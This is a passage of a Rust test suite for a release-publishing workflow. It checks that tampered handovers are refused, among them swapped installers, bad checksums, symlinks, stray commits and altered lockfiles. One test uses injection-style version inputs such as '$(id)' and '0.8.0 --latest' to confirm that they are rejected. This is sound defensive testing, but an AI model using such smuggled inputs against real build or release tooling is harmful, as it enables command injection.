                &format!("ARCA_VERSION={version}\nARCA_VERSION=0.9.9\n"),
            ),
            "an installer left at the release before" => rewrite(
                &cut,
                "scripts/install.sh",
                &format!("ARCA_VERSION={version}\n"),
                "ARCA_VERSION=0.1.0-alpha.7\n",
            ),
            "the installer's mode changed" => fs::set_permissions(
                cut.join("scripts/install.sh"),
                fs::Permissions::from_mode(0o755),
            )
            .expect("mode"),
            "another file" => put(&cut, "crates/a/src/lib.rs", "// slipped in\n"),
            "a new file" => put(&cut, "build.rs", "fn main() {}\n"),
            "a mode changed" => {
                fs::set_permissions(cut.join("Cargo.toml"), fs::Permissions::from_mode(0o755))
                    .expect("mode")
            }
            "a file turned into a link" => {
                fs::remove_file(cut.join("Cargo.toml")).expect("remove");
                std::os::unix::fs::symlink("Cargo.lock", cut.join("Cargo.toml")).expect("link");
            }
            _ => {}
        }
        git_at(&cut, &["add", "-A"]);
        if twist == "a file turned into a submodule entry" {
            // The path stays, and what it names is a commit of another repository instead of a file.
            let path = "packages/arca-canvas-dsh/package.json";
            let head = git_at(&cut, &["rev-parse", "HEAD"]);
            git_at(&cut, &["rm", "-q", "--cached", path]);
            git_at(
                &cut,
                &[
                    "update-index",
                    "--add",
                    "--cacheinfo",
                    &format!("160000,{head},{path}"),
                ],
            );
        }
        let message = match twist {
            "another subject" => "feat(a): not a release commit".to_string(),
            "a body in the commit's message" => format!("chore(release): {tag}\n\nFixes #1"),
            _ => format!("chore(release): {tag}"),
        };
        git_at(&cut, &["commit", "-q", "-m", &message]);
        let tag_message = match twist {
            "a body in the tag's message" => format!("Automagik Arca {version}\n\nFixes #1"),
            "another tag message" => "A release".to_string(),
            _ => format!("Automagik Arca {version}"),
        };
        if twist == "a plain tag" {
            git_at(&cut, &["tag", &tag]);
        } else {
            git_at(&cut, &["tag", "-a", &tag, "-m", &tag_message]);
        }

        // The build's four files, then the workflow's own step that hands everything over.
        self.files(&cut.join("dist"), version, "");
        let handed = self.step("Hand over", &cut, &[("MODE", "cut"), ("VERSION", version)]);
        assert_eq!(handed.code, Some(0), "{}", handed.said);
        let _ = fs::remove_dir_all(self.temp());
        fs::create_dir_all(self.temp()).expect("the temporary directory");
        fs::rename(cut.join("handover"), self.handed())
            .expect("the handover moves to the other job");

        // What is wrong with the bundle or the files themselves.
        let bundle = self.handed().join("release.bundle");
        let bundle_as = |refs: &[&str]| {
            let mut args = vec!["bundle", "create", "-q", bundle.to_str().expect("a path")];
            args.extend_from_slice(refs);
            git_at(&cut, &args);
        };
        let tag_ref = format!("refs/tags/{tag}");
        match twist {
            "an extra commit" => bundle_as(&[&tag_ref, "^HEAD~2"]),
            "two things in the bundle" => bundle_as(&[&tag_ref, "refs/heads/dev", "^HEAD~1"]),
            "the whole history in the bundle" => bundle_as(&[&tag_ref]),
            "a bundle cut short" => {
                // Its first lines are whole, so it names its tag and its parent; what follows them is not.
                let bytes = fs::read(&bundle).expect("read the bundle");
                fs::write(&bundle, &bytes[..bytes.len() - 20]).expect("write");
            }
            "a bundle of another line" => {
                // A release commit on a commit the remote never had.
                git_at(&cut, &["tag", "-d", &tag]);
                git_at(&cut, &["checkout", "-q", "--orphan", "elsewhere"]);
                git_at(&cut, &["commit", "-q", "-m", "feat(a): another line"]);
                rewrite(&cut, "CHANGELOG.md", "The first one.", "The first one!");
                git_at(
                    &cut,
                    &["commit", "-q", "-am", &format!("chore(release): {tag}")],
                );
                git_at(&cut, &["tag", "-a", &tag, "-m", &tag_message]);
                bundle_as(&[&tag_ref, "^HEAD~1"]);
            }
            _ => self.files(&self.handed(), version, twist),
        }
    }

    /// The four release files, as scripts/release.sh leaves them: the installer is the cutting job's checkout's own.
    /// `twist` names one thing wrong with them.
    fn files(&self, dir: &Path, version: &str, twist: &str) {
        fs::create_dir_all(dir).expect("the directory");
        let asset = format!("arca-{version}-linux-x86_64");
        fs::write(dir.join(&asset), "a binary\n").expect("write");
        fs::copy(
            self.dir().join("cut/scripts/install.sh"),
            dir.join("install.sh"),
        )
        .expect("the installer");
        fs::write(dir.join("RELEASE-NOTES.md"), "- a change\n").expect("write");
        let sums_of = |names: &[&str]| {
            let out = Command::new("sha256sum")
                .args(names)
                .current_dir(dir)
                .output()
                .expect("run sha256sum");
            String::from_utf8(out.stdout).expect("text")
        };
        let sums = sums_of(&[&asset, "install.sh"]);
        fs::write(dir.join("SHA256SUMS"), &sums).expect("write");
        match twist {
            "another binary" => fs::write(dir.join(&asset), "another binary\n").expect("write"),
            "an extra file" => fs::write(dir.join("notes.txt"), "words\n").expect("write"),
            "a file missing" => fs::remove_file(dir.join("RELEASE-NOTES.md")).expect("remove"),
            "the installer missing" => fs::remove_file(dir.join("install.sh")).expect("remove"),
            // A third line that is itself true: only the count of lines is wrong.
            "a third checksum" => {
                let both = format!("{sums}{}", sums_of(&["RELEASE-NOTES.md"]));
                fs::write(dir.join("SHA256SUMS"), both).expect("write");
            }
            // The same third line, not ended: a count of line ends alone would call it two lines.
            "a third checksum on a line not ended" => {
                let both = format!("{sums}{}", sums_of(&["RELEASE-NOTES.md"]).trim_end());
                fs::write(dir.join("SHA256SUMS"), both).expect("write");
            }
            "the binary's checksum alone" => {
                fs::write(dir.join("SHA256SUMS"), sums_of(&[&asset])).expect("write")
            }
            "a checksum of another name" => {
                fs::write(dir.join("SHA256SUMS"), sums.replace(&asset, "arca")).expect("write")
            }
            // Lines that sha256sum itself reads as true, and that are not written as it writes them.
            "one space in a checksum line" => {
                fs::write(dir.join("SHA256SUMS"), sums.replacen("  ", " ", 1)).expect("write")
            }
            "a tab in the installer's checksum line" => fs::write(
                dir.join("SHA256SUMS"),
                sums.replace("  install.sh", "\tinstall.sh"),
            )
            .expect("write"),
            "a space before a checksum" => {
                fs::write(dir.join("SHA256SUMS"), format!(" {sums}")).expect("write")
            }
            "a space at the end of a checksum line" => fs::write(
                dir.join("SHA256SUMS"),
                sums.replace("install.sh\n", "install.sh \n"),
            )
            .expect("write"),
            "the checksums the other way round" => {
                fs::write(dir.join("SHA256SUMS"), sums_of(&["install.sh", &asset])).expect("write")
            }
            // Two true lines, and the second is not the installer's.
            "the notes' checksum for the installer's" => fs::write(
                dir.join("SHA256SUMS"),
                sums_of(&[&asset, "RELEASE-NOTES.md"]),
            )
            .expect("write"),
            "an installer that is not the one its checksum names" => {
                fs::write(dir.join("install.sh"), "#!/bin/sh\necho another\n").expect("write")
            }
            // Another installer whose checksum is right: the file and SHA256SUMS agree, and the commit does not.
            "another installer under a true checksum" => {
                let own = fs::read_to_string(dir.join("install.sh")).expect("read");
                fs::write(
                    dir.join("install.sh"),
                    own.replace("echo \"installing", "echo \"also installing"),
                )
                .expect("write");
                fs::write(dir.join("SHA256SUMS"), sums_of(&[&asset, "install.sh"])).expect("write");
            }
            "a link" => {
                fs::remove_file(dir.join("RELEASE-NOTES.md")).expect("remove");
                std::os::unix::fs::symlink(dir.join("SHA256SUMS"), dir.join("RELEASE-NOTES.md"))
                    .expect("link");
            }
            "the installer as a link" => {
                fs::remove_file(dir.join("install.sh")).expect("remove");
                std::os::unix::fs::symlink(
                    self.dir().join("cut/scripts/install.sh"),
                    dir.join("install.sh"),
                )
                .expect("link");
            }
            _ => {}
        }
    }

    /// Runs one step of the workflow, by its name, in `cwd`, with the stand-in gh first on the path.
    fn step(&self, name: &str, cwd: &Path, env: &[(&str, &str)]) -> Ran {
        let script = self.dir().join("step.sh");
        fs::write(&script, step_script(name)).expect("write the step");
        let outputs = self.dir().join("step.outputs");
        fs::write(&outputs, "").expect("write");
        let path = format!(
            "{}:{}",
            self.dir().join("bin").display(),
            std::env::var("PATH").unwrap_or_default()
        );
        let out = Command::new("bash")
            .arg(&script)
            .current_dir(cwd)
            .env("PATH", path)
            .env("GITHUB_OUTPUT", &outputs)
            .env("GITHUB_REPOSITORY", "automagik-si/arca")
            .env("RUNNER_TEMP", self.temp())
            .env("GIT_CONFIG_GLOBAL", "/dev/null")
            .env("GIT_CONFIG_SYSTEM", "/dev/null")
            .env("GIT_AUTHOR_NAME", "test")
            .env("GIT_AUTHOR_EMAIL", "test@example.com")
            .env("GIT_COMMITTER_NAME", "test")
            .env("GIT_COMMITTER_EMAIL", "test@example.com")
            .env_remove("ARCA_VERSION_ROOT")
            .env_remove("HANDOVER")
            .envs(env.iter().copied())
            .output()
            .expect("run the step");
        let said = format!(
            "{}{}",
            String::from_utf8_lossy(&out.stdout),
            String::from_utf8_lossy(&out.stderr)
        );
        let outputs = fs::read_to_string(&outputs)
            .expect("read the outputs")
            .lines()
            .filter_map(|line| line.split_once('='))
            .map(|(key, value)| (key.to_string(), value.to_string()))
            .collect();
        Ran {
            code: out.status.code(),
            said,
            outputs,
        }
    }

    /// The publishing job's check of what was handed over, in a fresh checkout of the remote's dev. The job is told
    /// only the mode and the version; where the files are it knows from the runner's temporary directory.
    fn check(&self, mode: &str, version: &str) -> (PathBuf, Ran) {
        let publish = self.clone_as("publish");
        let ran = self.step(
            "Check what was handed over",
            &publish,
            &[("MODE", mode), ("VERSION", version)],
        );
        (publish, ran)
    }
}

#[test]
fn the_publishing_job_checks_what_it_was_handed_pushes_both_at_once_and_publishes() {
    let lab = Lab::new("publish");
    let before = lab.remote(&["rev-parse", "dev"]);
    lab.hand_over("0.8.0", "");
    let (publish, check) = lab.check("cut", "0.8.0");
    assert_eq!(check.code, Some(0), "{}", check.said);
    let commit = check.outputs.get("commit").expect("the commit").clone();
    assert!(!check.outputs.contains_key("moved"));
    assert_eq!(
        lab.remote(&["rev-parse", "dev"]),
        before,
        "the check pushes nothing"
    );

    let env = [
        ("MODE", "cut"),
        ("VERSION", "0.8.0"),
        ("COMMIT", commit.as_str()),
        ("PRERELEASE", "false"),
    ];
    let push = lab.step("Push dev and the tag", &publish, &env);
    assert_eq!(push.code, Some(0), "{}", push.said);
    assert_eq!(push.outputs.get("pushed").map(String::as_str), Some("true"));
    assert_eq!(lab.remote(&["rev-parse", "dev"]), commit);
    assert_eq!(lab.remote(&["rev-parse", "v0.8.0^{commit}"]), commit);
    assert_eq!(lab.remote(&["cat-file", "-t", "v0.8.0"]), "tag");
    assert_eq!(lab.remote(&["rev-parse", "dev~1"]), before);
    // What landed is the version in every field, written by the repository's own script.
    assert!(
        lab.remote(&["show", "dev:Cargo.lock"])
            .contains("name = \"a\"\nversion = \"0.8.0\"")
    );
    assert!(
        lab.remote(&["show", "dev:Cargo.lock"])
            .contains("name = \"dep\"\nversion = \"0.1.0-alpha.7\""),
        "a dependency with the same number is not the workspace's"
    );
    // The installer that landed installs this release, and the one handed over to be published is that file.
    let landed = lab.remote(&["show", "dev:scripts/install.sh"]);
    assert!(landed.contains("\nARCA_VERSION=0.8.0\n"), "{landed}");
    assert_eq!(
        fs::read_to_string(lab.handed().join("install.sh"))
            .expect("the installer")
            .trim_end(),
        landed
    );

    let done = lab.step("Publish the release", &publish, &env);
    assert_eq!(done.code, Some(0), "{}", done.said);
    assert_eq!(
        lab.created(),
        "release create v0.8.0 arca-0.8.0-linux-x86_64 install.sh SHA256SUMS --latest --repo automagik-si/arca --verify-tag \
         --title Automagik Arca 0.8.0 --notes-file RELEASE-NOTES.md\n"
    );
    assert_eq!(
        done.outputs.get("version").map(String::as_str),
        Some("0.8.0")
    );
    assert_eq!(done.outputs.get("sha"), Some(&commit));

    // By hand, as a prerelease: never Latest.
    let mut hand = env.to_vec();
    hand[3] = ("PRERELEASE", "true");
    lab.step("Publish the release", &publish, &hand);
    assert!(
        lab.created()
            .lines()
            .last()
            .expect("a line")
            .contains("SHA256SUMS --prerelease --latest=false --repo")
    );

    // The next release stands on that one: a patch, with what someone wrote under Unreleased leading its section.
    lab.releases("v0.8.0 published\nv0.1.0-alpha.7 published\n");
    let other = lab.clone_as("other");
    rewrite(
        &other,
        "CHANGELOG.md",
        "its heading above it. -->\n",
        "its heading above it. -->\n\nA note someone wrote.\n",
    );
    put(&other, "packages/arca-canvas-dsh/index.js", "// a card\n");
    git_at(&other, &["add", "-A"]);
    git_at(&other, &["commit", "-q", "-m", "feat(canvas): a card"]);
    git_at(&other, &["push", "-q", "origin", "dev"]);
    lab.hand_over("0.8.1", "");
    let (_, second) = lab.check("cut", "0.8.1");
    assert_eq!(second.code, Some(0), "{}", second.said);
}

#[test]
fn when_dev_moved_before_the_check_nothing_is_pushed_and_the_run_ends_cleanly() {
    let lab = Lab::new("moved");
    lab.hand_over("0.8.0", "");
    lab.someone_pushes("crates/a/src/b.rs", "feat(a): a newer push");
    let newer = lab.remote(&["rev-parse", "dev"]);

    let (_, check) = lab.check("cut", "0.8.0");
    assert_eq!(check.code, Some(0), "{}", check.said);
    assert_eq!(check.outputs.get("moved").map(String::as_str), Some("true"));
    assert!(
        !check.outputs.contains_key("commit"),
        "no commit, so the push and the publishing are skipped"
    );
    assert!(
        check
            .said
            .contains("::notice::dev moved on while this run cut v0.8.0")
    );
    assert_eq!(lab.remote(&["rev-parse", "dev"]), newer);
    assert!(!lab.remote_has_tag("v0.8.0"));
    assert_eq!(lab.created(), "");
}

#[test]
fn when_dev_moves_between_the_check_and_the_push_neither_the_commit_nor_the_tag_lands() {
    let lab = Lab::new("refused");
    lab.hand_over("0.8.0", "");
    let (publish, check) = lab.check("cut", "0.8.0");
    assert_eq!(check.code, Some(0), "{}", check.said);
    let commit = check.outputs.get("commit").expect("the commit").clone();

    lab.someone_pushes("crates/a/src/b.rs", "feat(a): a newer push");
    let newer = lab.remote(&["rev-parse", "dev"]);
    let push = lab.step(
        "Push dev and the tag",
        &publish,
        &[("VERSION", "0.8.0"), ("COMMIT", commit.as_str())],
    );
    assert_eq!(
        push.code,
        Some(0),
        "a refused push is a clean end: {}",
        push.said
    );
    assert!(
        !push.outputs.contains_key("pushed"),
        "so the publishing is skipped"
    );
    assert!(
        push.said
            .contains("::notice::dev moved on while this run cut v0.8.0")
    );
    assert_eq!(
        lab.remote(&["rev-parse", "dev"]),
        newer,
        "dev is the newer push's"
    );
    assert!(
        !lab.remote_has_tag("v0.8.0"),
        "atomic: the tag did not land either"
    );
}

/// Each way a handover is not exactly a release, with the words of the one check that must catch it. Every other part
/// of each handover is right, so the words name the check that fired.
const REFUSED: [(&str, &str); 64] = [
    // The files.
    (
        "an extra file",
        "the handed-over files are not the expected ones",
    ),
    (
        "a file missing",
        "the handed-over files are not the expected ones",
    ),
    (
        "the installer missing",
        "the handed-over files are not the expected ones",
    ),
    ("a link", "is not a plain file"),
    (
        "the installer as a link",
        "./install.sh is not a plain file",
    ),
    (
        "a third checksum",
        "SHA256SUMS does not hold exactly two lines",
    ),
    (
        "a third checksum on a line not ended",
        "SHA256SUMS does not hold exactly two lines",
    ),
    (
        "the binary's checksum alone",
        "SHA256SUMS does not hold exactly two lines",
    ),
    (
        "a checksum of another name",
        "SHA256SUMS does not name arca-0.8.0-linux-x86_64 with a SHA-256 on its first line",
    ),
    (
        "the checksums the other way round",
        "SHA256SUMS does not name arca-0.8.0-linux-x86_64 with a SHA-256 on its first line",
    ),
    (
        "the notes' checksum for the installer's",
        "SHA256SUMS does not name install.sh with a SHA-256 on its second line",
    ),
    ("another binary", "a release file does not match SHA256SUMS"),
    (
        "an installer that is not the one its checksum names",
        "a release file does not match SHA256SUMS",
    ),
    (
        "one space in a checksum line",
        "SHA256SUMS is not written as sha256sum writes it",
    ),
    (
        "a tab in the installer's checksum line",
        "SHA256SUMS is not written as sha256sum writes it",
    ),
    (
        "a space before a checksum",
        "SHA256SUMS is not written as sha256sum writes it",
    ),
    (
        "a space at the end of a checksum line",
        "SHA256SUMS is not written as sha256sum writes it",
    ),
    // The installer that would be published is not the one the release commit holds.
    (
        "another installer under a true checksum",
        "install.sh is not the release commit's scripts/install.sh",
    ),
    // The bundle.
    (
        "two things in the bundle",
        "the bundle does not hold v0.8.0 alone",
    ),
    (
        "the whole history in the bundle",
        "the bundle does not stand on exactly one commit",
    ),
    (
        "a bundle of another line",
        "the bundle does not stand on dev",
    ),
    (
        "a bundle cut short",
        "the bundle cannot be read on top of dev",
    ),
    // The tag and the commit, and the whole of their messages.
    (
        "a plain tag",
        "v0.8.0 is not an annotated tag of that name on a commit",
    ),
    (
        "an extra commit",
        "the release commit is not exactly one commit on top of dev",
    ),
    (
        "another subject",
        "the commit's message is not exactly chore(release): v0.8.0",
    ),
    (
        "a body in the commit's message",
        "the commit's message is not exactly chore(release): v0.8.0",
    ),
    (
        "a body in the tag's message",
        "the tag's message is not exactly Automagik Arca 0.8.0",
    ),
    (
        "another tag message",
        "the tag's message is not exactly Automagik Arca 0.8.0",
    ),
    // Which files the commit changes, and what kind of thing each is.
    ("another file", "does not change exactly the six files"),
    ("a new file", "does not change exactly the six files"),
    (
        "an installer left at the release before",
        "does not change exactly the six files",
    ),
    ("a mode changed", "changes a file's kind or mode"),
    (
        "the installer's mode changed",
        "changes a file's kind or mode",
    ),
    ("a file turned into a link", "changes a file's kind or mode"),
    (
        "a file turned into a submodule entry",
        "changes a file's kind or mode",
    ),
    // What it changes in them, line by line.
    (
        "a patch entry",
        "Cargo.toml changes something other than the workspace version line",
    ),
    (
        "a pin moved",
        "Cargo.toml changes something other than the workspace version line",
    ),
    (
        "another number in the manifest",
        "Cargo.toml changes something other than the workspace version line",
    ),
    (
        "a dependency repointed",
        "Cargo.lock changes something other than the version lines",
    ),
    (
        "a dependency's version",
        "Cargo.lock changes something other than the version lines",
    ),
    (
        "a crate at another number",
        "Cargo.lock changes something other than the version lines",
    ),
    (
        "a script changed",
        "package.json changes something other than its version line",
    ),
    (
        "an integrity changed",
        "package-lock.json changes something other than its two version lines",
    ),
    (
        "a resolved address changed",
        "package-lock.json changes something other than its two version lines",
    ),
    (
        "a dependency's lock version",
        "package-lock.json changes something other than its two version lines",
    ),
    // The installer: its one version line, and no other byte.
    (
        "an installer line changed",
        "scripts/install.sh changes something other than its ARCA_VERSION line",
    ),
    (
        "an installer line added",
        "scripts/install.sh changes something other than its ARCA_VERSION line",
    ),
    (
        "an installer at another number",
        "scripts/install.sh changes something other than its ARCA_VERSION line",
    ),
    (
        "a second version line in the installer",
        "scripts/install.sh changes something other than its ARCA_VERSION line",
    ),
    // The changelog: nothing removed or changed, one heading in its place, and list lines.
    (
        "a changelog line removed",
        "CHANGELOG.md has a line removed or changed",
    ),
    (
        "a changelog line changed",
        "CHANGELOG.md has a line removed or changed",
    ),
    (
        "a changelog line below",
        "CHANGELOG.md gains a line outside the new section",
    ),
    (
        "a changelog line above",
        "CHANGELOG.md gains a line above the new section",
    ),
    (
        "another section",
        "CHANGELOG.md has no section for 0.8.0 right under Unreleased",
    ),
    (
        "the heading inside the comment",
        "the new section starts inside a comment",
    ),
    (
        "a second heading",
        "CHANGELOG.md gains a line that is not a list line",
    ),
    (
        "an indented heading",
        "CHANGELOG.md gains a line that is not a list line",
    ),
    (
        "an underlined heading",
        "CHANGELOG.md gains a line that is not a list line",
    ),
    (
        "a paragraph",
        "CHANGELOG.md gains a line that is not a list line",
    ),
    (
        "a carriage return in a line",
        "CHANGELOG.md gains a control character",
    ),
    (
        "a tab before a heading",
        "CHANGELOG.md gains a control character",
    ),
    (
        "an escape code in a line",
        "CHANGELOG.md gains a control character",
    ),
    ("an unclosed comment", "CHANGELOG.md gains a line with a <"),
    ("a tag in a line", "CHANGELOG.md gains a line with a <"),
];

#[test]
fn the_publishing_job_refuses_what_is_not_exactly_a_release_and_says_which_check() {
    for (twist, words) in REFUSED {
        let lab = Lab::new("twist");
        let before = lab.remote(&["rev-parse", "dev"]);
        lab.hand_over("0.8.0", twist);
        let (_, check) = lab.check("cut", "0.8.0");
        assert_eq!(check.code, Some(1), "{twist} is refused: {}", check.said);
        let errors: Vec<&str> = check
            .said
            .lines()
            .filter(|line| line.starts_with("::error::"))
            .collect();
        assert!(
            errors.last().is_some_and(|line| line.contains(words)),
            "{twist} is caught by its own check ({words}), not: {}",
            check.said
        );
        assert!(!check.outputs.contains_key("commit"), "{twist}");
        assert_eq!(lab.remote(&["rev-parse", "dev"]), before, "{twist}");
        assert!(!lab.remote_has_tag("v0.8.0"), "{twist}");
    }
}

#[test]
fn the_publishing_job_refuses_a_wrong_name_a_taken_tag_and_a_published_release() {
    let lab = Lab::new("names");
    lab.hand_over("0.8.0", "");
    for version in [
        "0.8",
        "v0.8.0",
        "0.8.0 --latest",
        "0.8.0\nx",
        "$(id)",
        "",
        "0.08.0",
    ] {
        let (_, check) = lab.check("cut", version);
        assert_eq!(check.code, Some(1), "{version:?}: {}", check.said);
        assert!(check.said.contains("not a version"), "{version:?}");
    }
    let (_, other) = lab.check("cut", "0.9.0");
    assert_eq!(other.code, Some(1), "{}", other.said);
    assert!(
        other
            .said
            .contains("the handed-over files are not the expected ones"),
        "the files are 0.8.0's"
    );
    let (_, mode) = lab.check("push", "0.8.0");
    assert_eq!(mode.code, Some(1));
    assert!(mode.said.contains("not a mode"));

    lab.releases("v0.8.0 published\nv0.1.0-alpha.7 published\n");
    let (_, published) = lab.check("cut", "0.8.0");
    assert_eq!(published.code, Some(1));
    assert!(published.said.contains("v0.8.0 is already published"));
    // A draft is not a published release: it stops nothing.
    lab.releases("v0.8.0 draft\nv0.1.0-alpha.7 published\n");
    let (_, draft) = lab.check("cut", "0.8.0");
    assert_eq!(draft.code, Some(0), "{}", draft.said);

    lab.releases("v0.1.0-alpha.7 published\n");
    git_at(&lab.dir().join("cut"), &["push", "-q", "origin", "v0.8.0"]);
    let (_, taken) = lab.check("cut", "0.8.0");
    assert_eq!(taken.code, Some(1));
    assert!(taken.said.contains("v0.8.0 is already on the remote"));
}

/// The installer's version line of the stand-in repository, moved by hand from the old numbering to `version`.
fn bump_installer(cut: &Path, version: &str) {
    rewrite(
        cut,
        "scripts/install.sh",
        "ARCA_VERSION=0.1.0-alpha.7\n",
        &format!("ARCA_VERSION={version}\n"),
    );
}

/// The version lines of the stand-in repository, moved by hand from the old numbering to `version`.
fn bump_by_hand(cut: &Path, version: &str) {
    let lock = "packages/arca-canvas-dsh/package-lock.json";
    bump_installer(cut, version);
    rewrite(
        cut,
        "Cargo.toml",
        "version = \"0.1.0-alpha.7\"",
        &format!("version = \"{version}\""),
    );
    rewrite(
        cut,
        "Cargo.lock",
        "name = \"a\"\nversion = \"0.1.0-alpha.7\"",
        &format!("name = \"a\"\nversion = \"{version}\""),
    );
    rewrite(
        cut,
        "packages/arca-canvas-dsh/package.json",
        "  \"version\": \"0.1.0-alpha.7\"",
        &format!("  \"version\": \"{version}\""),
    );
    rewrite(
        cut,
        lock,
        "  \"version\": \"0.1.0-alpha.7\"",
        &format!("  \"version\": \"{version}\""),
    );
    rewrite(
        cut,
        lock,
        "\"name\": \"arca-canvas-dsh\",\n      \"version\": \"0.1.0-alpha.7\"",
        &format!("\"name\": \"arca-canvas-dsh\",\n      \"version\": \"{version}\""),
    );
}

#[test]
fn when_dev_s_own_files_are_not_as_expected_the_publishing_job_says_which_and_why() {
    let package = "packages/arca-canvas-dsh/package.json";
    let lock = "packages/arca-canvas-dsh/package-lock.json";
    let refused = |lab: &Lab, words: &str| {
        let before = lab.remote(&["rev-parse", "dev"]);
        let (_, check) = lab.check("cut", "0.8.0");
        assert_eq!(check.code, Some(1), "{}", check.said);
        let last = check
            .said
            .lines()
            .filter(|line| line.starts_with("::error::"))
            .last()
            .unwrap_or("");
        assert!(
            last.contains(words),
            "wanted {words:?}, not: {}",
            check.said
        );
        assert_eq!(lab.remote(&["rev-parse", "dev"]), before);
        assert!(!lab.remote_has_tag("v0.8.0"));
    };

    // dev's own manifest states the version in a way the check does not read.
    let lab = Lab::new("unread");
    lab.dev_changes("chore: quotes", |dev| {
        rewrite(
            dev,
            "Cargo.toml",
            "version = \"0.1.0-alpha.7\"",
            "version = '0.1.0-alpha.7'",
        )
    });
    lab.hand_over_written("0.8.0", "", |cut| {
        rewrite(
            cut,
            "Cargo.toml",
            "version = '0.1.0-alpha.7'",
            "version = '0.8.0'",
        );
        rewrite(
            cut,
            "Cargo.lock",
            "name = \"a\"\nversion = \"0.1.0-alpha.7\"",
            "name = \"a\"\nversion = \"0.8.0\"",
        );
        rewrite(
            cut,
            package,
            "  \"version\": \"0.1.0-alpha.7\"",
            "  \"version\": \"0.8.0\"",
        );
        rewrite(
            cut,
            lock,
            "  \"version\": \"0.1.0-alpha.7\"",
            "  \"version\": \"0.8.0\"",
        );
        bump_installer(cut, "0.8.0");
        lab.version_sh(cut, &["changelog", "0.8.0", "2026-11-12"]);
    });
    refused(
        &lab,
        "dev's own version cannot be read, or is 0.8.0 already",
    );

    // dev's own manifest already states the version that was handed over.
    let lab = Lab::new("already");
    lab.dev_changes("chore: a number by hand", |dev| {
        rewrite(
            dev,
            "Cargo.toml",
            "version = \"0.1.0-alpha.7\"",
            "version = \"0.8.0\"",
        )
    });
    lab.hand_over_written("0.8.0", "", |cut| {
        rewrite(
            cut,
            "Cargo.toml",
            "version = \"0.8.0\"",
            "version = \"0.8.0\" ",
        );
        rewrite(
            cut,
            "Cargo.lock",
            "name = \"a\"\nversion = \"0.1.0-alpha.7\"",
            "name = \"a\"\nversion = \"0.8.0\"",
        );
        rewrite(
            cut,
            package,
            "  \"version\": \"0.1.0-alpha.7\"",
            "  \"version\": \"0.8.0\"",
        );
        rewrite(
            cut,
            lock,
            "  \"version\": \"0.1.0-alpha.7\"",
            "  \"version\": \"0.8.0\"",
        );
        bump_installer(cut, "0.8.0");
        lab.version_sh(cut, &["changelog", "0.8.0", "2026-11-12"]);
    });
    refused(
        &lab,
        "dev's own version cannot be read, or is 0.8.0 already",
    );

    // dev's own package.json has no version line.
    let lab = Lab::new("noline");
    lab.dev_changes("chore: no version", |dev| {
        rewrite(dev, package, "  \"version\": \"0.1.0-alpha.7\",\n", "")
    });
    lab.hand_over_written("0.8.0", "", |cut| {
        rewrite(
            cut,
            "Cargo.toml",
            "version = \"0.1.0-alpha.7\"",
            "version = \"0.8.0\"",
        );
        rewrite(
            cut,
            "Cargo.lock",
            "name = \"a\"\nversion = \"0.1.0-alpha.7\"",
            "name = \"a\"\nversion = \"0.8.0\"",
        );
        rewrite(
            cut,
            package,
            "  \"scripts\": {",
            "  \"version\": \"0.8.0\",\n  \"scripts\": {",
        );
        rewrite(
            cut,
            lock,
            "  \"version\": \"0.1.0-alpha.7\"",
            "  \"version\": \"0.8.0\"",
        );
        rewrite(
            cut,
            lock,
            "\"name\": \"arca-canvas-dsh\",\n      \"version\": \"0.1.0-alpha.7\"",
            "\"name\": \"arca-canvas-dsh\",\n      \"version\": \"0.8.0\"",
        );
        bump_installer(cut, "0.8.0");
        lab.version_sh(cut, &["changelog", "0.8.0", "2026-11-12"]);
    });
    refused(
        &lab,
        "dev's own packages/arca-canvas-dsh/package.json has no version line to move",
    );

    // dev's own lock states another number for the root package than the workspace's.
    let lab = Lab::new("drift");
    lab.dev_changes("chore: a drifted lock", |dev| {
        rewrite(
            dev,
            lock,
            "\"name\": \"arca-canvas-dsh\",\n      \"version\": \"0.1.0-alpha.7\"",
            "\"name\": \"arca-canvas-dsh\",\n      \"version\": \"0.0.1\"",
        )
    });
    lab.hand_over_written("0.8.0", "", |cut| {
        rewrite(
            cut,
            lock,
            "      \"version\": \"0.0.1\"",
            "      \"version\": \"0.1.0-alpha.7\"",
        );
        bump_by_hand(cut, "0.8.0");
        lab.version_sh(cut, &["changelog", "0.8.0", "2026-11-12"]);
    });
    refused(
        &lab,
        "dev's own packages/arca-canvas-dsh/package-lock.json does not say 0.1.0-alpha.7 at line 8",
    );

    // dev's own lock has no version line for the root package.
    let lab = Lab::new("noroot");
    lab.dev_changes("chore: a lock without its root's version", |dev| {
        rewrite(
            dev,
            lock,
            "\"name\": \"arca-canvas-dsh\",\n      \"version\": \"0.1.0-alpha.7\",\n",
            "\"name\": \"arca-canvas-dsh\",\n",
        )
    });
    lab.hand_over_written("0.8.0", "", |cut| {
        rewrite(
            cut,
            "Cargo.toml",
            "version = \"0.1.0-alpha.7\"",
            "version = \"0.8.0\"",
        );
        rewrite(
            cut,
            "Cargo.lock",
            "name = \"a\"\nversion = \"0.1.0-alpha.7\"",
            "name = \"a\"\nversion = \"0.8.0\"",
        );
        rewrite(
            cut,
            package,
            "  \"version\": \"0.1.0-alpha.7\"",
            "  \"version\": \"0.8.0\"",
        );
        rewrite(
            cut,
            lock,
            "  \"version\": \"0.1.0-alpha.7\"",
            "  \"version\": \"0.8.0\"",
        );
        bump_installer(cut, "0.8.0");
        lab.version_sh(cut, &["changelog", "0.8.0", "2026-11-12"]);
    });
    refused(
        &lab,
        "dev's own packages/arca-canvas-dsh/package-lock.json has no version line to move",
    );

    // dev's own changelog already has the section: the release adds a line to it, and no heading.
    let lab = Lab::new("oldsection");
    lab.dev_changes("docs: a section by hand", |dev| {
        rewrite(
            dev,
            "CHANGELOG.md",
            "## 0.1.0-alpha.7\n",
            "## 0.8.0 (2026-11-12)\n\n- An older line.\n\n## 0.1.0-alpha.7\n",
        )
    });
    lab.hand_over_written("0.8.0", "", |cut| {
        bump_by_hand(cut, "0.8.0");
        rewrite(
            cut,
            "CHANGELOG.md",
            "- An older line.\n",
            "- An older line.\n- A new line.\n",
        );
    });
    refused(&lab, "the section for 0.8.0 is not new");

    // dev's own installer names another release than the workspace's version.
    let lab = Lab::new("installer-drift");
    lab.dev_changes("chore: an installer at another number", |dev| {
        rewrite(
            dev,
            "scripts/install.sh",
            "ARCA_VERSION=0.1.0-alpha.7\n",
            "ARCA_VERSION=0.0.1\n",
        )
    });
    lab.hand_over_written("0.8.0", "", |cut| {
        rewrite(
            cut,
            "scripts/install.sh",
            "ARCA_VERSION=0.0.1\n",
            "ARCA_VERSION=0.1.0-alpha.7\n",
        );
        bump_by_hand(cut, "0.8.0");
        lab.version_sh(cut, &["changelog", "0.8.0", "2026-11-12"]);
